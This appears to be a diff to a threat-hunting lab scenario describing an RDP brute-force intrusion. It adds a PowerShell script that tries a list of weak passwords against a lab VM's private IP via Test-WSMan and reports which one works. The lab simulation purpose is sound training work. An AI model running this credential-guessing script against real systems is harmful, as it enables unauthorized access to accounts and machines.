@@ -5,8 +5,23 @@
 1. **Reconnaissance**: The bad actor scans for open RDP ports (TCP 3389) on the target network.
    - Utilizes Nmap to find exposed services.
 2. **Brute Force**: The bad actor attempts to authenticate using brute force.
-   - Common usernames attempted: `Administrator`, `Admin`, `root`, etc.
-   - Common passwords: `Password123!`, `P@ssw0rd!`, etc.
+   - Use a PowerShell script to simulate a BruteForce attempt.
+``` $username = "Administrator"  # Change to a valid username
+$passwords = @("Password123!", "P@ssw0rd!", "Admin123", "123456")  # List of passwords to try
+$victimIP = "10.0.0.26"  # Replace with the private IP of `thscenariovm`
+
+foreach ($password in $passwords) {
+    try {
+        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+        $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
+        Test-WSMan -ComputerName $victimIP -Credential $credential -ErrorAction Stop
+        Write-Host "Login successful with password: $password"
+        break
+    } catch {
+        Write-Host "Login failed with password: $password"
+    }
+}
+```
 3. **Successful Login**: The attacker successfully logs into the machine over RDP.
    - Logs show the source IP address used for RDP access.
 4. **Command Execution**: The attacker executes commands or malicious scripts once logged in (e.g., downloading malware, lateral movement).
